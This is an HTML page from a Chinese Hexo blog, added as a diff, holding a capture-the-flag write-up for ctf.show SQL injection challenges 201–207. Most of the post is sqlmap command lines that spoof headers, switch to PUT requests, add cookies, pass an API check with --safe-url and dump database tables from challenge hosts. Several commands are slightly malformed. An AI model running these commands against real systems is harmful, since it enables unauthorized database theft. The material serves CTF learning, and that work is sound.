@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="sql注入——sqlmap201 使用sqlmap注入1、首先抓包发现id的传入地址，构造 http:&#x2F;&#x2F;60e24393-3416-4fb8-ae96-323000f29b59.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1  2、题目要求绕过user_agent和referer检查（只要跟原来的不一样就可以了）  所以查询sqlmap.py -u http:&#x2F;&#x2F;04fa3df3-1f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2022/04/16/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94sqlmap/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql注入——sqlmap201 使用sqlmap注入1、首先抓包发现id的传入地址，构造 http:&#x2F;&#x2F;60e24393-3416-4fb8-ae96-323000f29b59.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1  2、题目要求绕过user_agent和referer检查（只要跟原来的不一样就可以了）  所以查询sqlmap.py -u http:&#x2F;&#x2F;04fa3df3-1f">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:/boke/source_posts/SQL注入/image-20220414091248768.png">
+<meta property="og:image" content="d:/boke/source_posts/SQL注入/image-20220414091358827.png">
+<meta property="og:image" content="d:/boke/source_posts/SQL注入/image-20220414095129796.png">
+<meta property="og:image" content="d:/boke/source_posts/SQL注入/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTUxNTk4,size_16,color_FFFFFF,t_70.png">
+<meta property="article:published_time" content="2022-04-16T15:23:59.727Z">
+<meta property="article:modified_time" content="2022-04-16T15:23:59.727Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/boke/source_posts/SQL注入/image-20220414091248768.png">
+
+<link rel="canonical" href="http://example.com/2022/04/16/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94sqlmap/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/16/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94sqlmap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-16 23:23:59" itemprop="dateCreated datePublished" datetime="2022-04-16T23:23:59+08:00">2022-04-16</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="sql注入——sqlmap"><a href="#sql注入——sqlmap" class="headerlink" title="sql注入——sqlmap"></a>sql注入——sqlmap</h1><h3 id="201-使用sqlmap注入"><a href="#201-使用sqlmap注入" class="headerlink" title="201 使用sqlmap注入"></a>201 使用sqlmap注入</h3><p>1、首先抓包发现id的传入地址，构造</p>
+<p><a target="_blank" rel="noopener" href="http://60e24393-3416-4fb8-ae96-323000f29b59.challenge.ctf.show/api/?id=1">http://60e24393-3416-4fb8-ae96-323000f29b59.challenge.ctf.show/api/?id=1</a></p>
+<p><img src="D:\boke\source_posts\SQL注入\image-20220414091248768.png" alt="image-20220414091248768"></p>
+<p>2、题目要求绕过user_agent和referer检查（只要跟原来的不一样就可以了）</p>
+<p><img src="D:\boke\source_posts\SQL注入\image-20220414091358827.png" alt="image-20220414091358827"></p>
+<p>所以查询<br>sqlmap.py -u <a target="_blank" rel="noopener" href="http://04fa3df3-1f55-4d3d-bd7b-73875bf0ea29.challenge.ctf.show/api/?id=1&quot;">http://04fa3df3-1f55-4d3d-bd7b-73875bf0ea29.challenge.ctf.show/api/?id=1&quot;</a> –referer=ctf.show –user_agent=flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://60e24393-3416-4fb8-ae96-323000f29b59.challenge.ctf.show/api/?id=1&quot; --user-agent=sqlmap --referer=ctf.show? --dbs   查看数据ku</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://60e24393-3416-4fb8-ae96-323000f29b59.challenge.ctf.show/api/?id=1&quot; --user-agent=sqlmap --referer=ctf.show? -d ctfshow_web --tables</span><br><span class="line">指定数据库ctfshow_web查看表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://60e24393-3416-4fb8-ae96-323000f29b59.challenge.ctf.show/api/?id=1&quot; --user-agent=sqlmap --referer=ctf.show? -d ctfshow_web -t ctfshow_user --columns  查询字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://55520756-c400-4fe8-a2a6-12374bd30121.challenge.ctf.show/api/&quot; --data &quot;id=1&quot; --user-agent=sqlmap --referer=ctf.show? -d ctfshow_web -t ctfshow_user --dump  查看表中的内</span><br></pre></td></tr></table></figure>
+
+<h3 id="202-有个坑——注意要将–data-“id-1”，要url后面加上index-php"><a href="#202-有个坑——注意要将–data-“id-1”，要url后面加上index-php" class="headerlink" title="202  有个坑——注意要将–data “id=1”，要url后面加上index.php"></a>202  有个坑——注意要将–data “id=1”，要url后面加上index.php</h3><p><img src="D:\boke\source_posts\SQL注入\image-20220414095129796.png" alt="image-20220414095129796"></p>
+<p> 做法与前面一题类似：首先利用–data将请求方式改为post</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://55520756-c400-4fe8-a2a6-12374bd30121.challenge.ctf.show/api/&quot; --data &quot;id=1&quot; --referer=ctf.show?</span><br></pre></td></tr></table></figure>
+
+<h3 id="203-利用method改变提交方式——put请求方式需要改边headers-“Content-Type-text-plain”"><a href="#203-利用method改变提交方式——put请求方式需要改边headers-“Content-Type-text-plain”" class="headerlink" title="203  利用method改变提交方式——put请求方式需要改边headers=“Content-Type:text/plain”"></a>203  利用method改变提交方式——put请求方式需要改边headers=“Content-Type:text/plain”</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://3542fabd-efec-4260-a49e-03873689acff.challenge.ctf.show/api/index.php&quot;  --method=PUT --data=&quot;id=1&quot;  --referer=ctf.show --headers=&quot;content-type:text/plain&quot; -- --cookie=&quot;PHPSESSID=pgcr5r4ljghokprumt2d6j4il3&quot;-D ctfshow_web -T ctfshow_user --dump</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="204-添加cookie值"><a href="#204-添加cookie值" class="headerlink" title="204 添加cookie值"></a>204 添加cookie值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://c9050c36-8795-49cd-bc83-2d2bfa6b9fa0.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;content-type:text/plain&quot; --cookie=&quot;a17rq6k1q11lnblqeeok6ndj99&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="205-sqlmap–api鉴权"><a href="#205-sqlmap–api鉴权" class="headerlink" title="205 sqlmap–api鉴权"></a>205 sqlmap–api鉴权</h3><p>前提：</p>
+<p><img src="D:\boke\source_posts\SQL注入\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTUxNTk4,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
+<p>playload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://709c1c4a-724b-4b9b-90e8-09498cd2014e.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;content-type:text/plain&quot; --safe-url=&quot;http://709c1c4a-724b-4b9b-90e8-09498cd2014e.challenge.ctf.show/sqlmap.php&quot; --safe-freq=1</span><br><span class="line"></span><br><span class="line">先测试能不能注入</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://709c1c4a-724b-4b9b-90e8-09498cd2014e.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;content-type:text/plain&quot; --safe-url=&quot;http://709c1c4a-724b-4b9b-90e8-09498cd2014e.challenge.ctf.show/sqlmap.php&quot; --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump</span><br><span class="line"></span><br><span class="line">换了张表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="206-207-开始用tamp使用脚本进行绕过替换"><a href="#206-207-开始用tamp使用脚本进行绕过替换" class="headerlink" title="206-207 开始用tamp使用脚本进行绕过替换"></a>206-207 开始用tamp使用脚本进行绕过替换</h3>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/19/%E6%BC%8F%E6%B4%9E/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94sqlmap"><span class="nav-number">1.</span> <span class="nav-text">sql注入——sqlmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#201-%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5"><span class="nav-number">1.0.1.</span> <span class="nav-text">201 使用sqlmap注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#202-%E6%9C%89%E4%B8%AA%E5%9D%91%E2%80%94%E2%80%94%E6%B3%A8%E6%84%8F%E8%A6%81%E5%B0%86%E2%80%93data-%E2%80%9Cid-1%E2%80%9D%EF%BC%8C%E8%A6%81url%E5%90%8E%E9%9D%A2%E5%8A%A0%E4%B8%8Aindex-php"><span class="nav-number">1.0.2.</span> <span class="nav-text">202  有个坑——注意要将–data “id&#x3D;1”，要url后面加上index.php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#203-%E5%88%A9%E7%94%A8method%E6%94%B9%E5%8F%98%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E2%80%94%E2%80%94put%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E9%9C%80%E8%A6%81%E6%94%B9%E8%BE%B9headers-%E2%80%9CContent-Type-text-plain%E2%80%9D"><span class="nav-number">1.0.3.</span> <span class="nav-text">203  利用method改变提交方式——put请求方式需要改边headers&#x3D;“Content-Type:text&#x2F;plain”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#204-%E6%B7%BB%E5%8A%A0cookie%E5%80%BC"><span class="nav-number">1.0.4.</span> <span class="nav-text">204 添加cookie值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#205-sqlmap%E2%80%93api%E9%89%B4%E6%9D%83"><span class="nav-number">1.0.5.</span> <span class="nav-text">205 sqlmap–api鉴权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#206-207-%E5%BC%80%E5%A7%8B%E7%94%A8tamp%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.0.6.</span> <span class="nav-text">206-207 开始用tamp使用脚本进行绕过替换</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
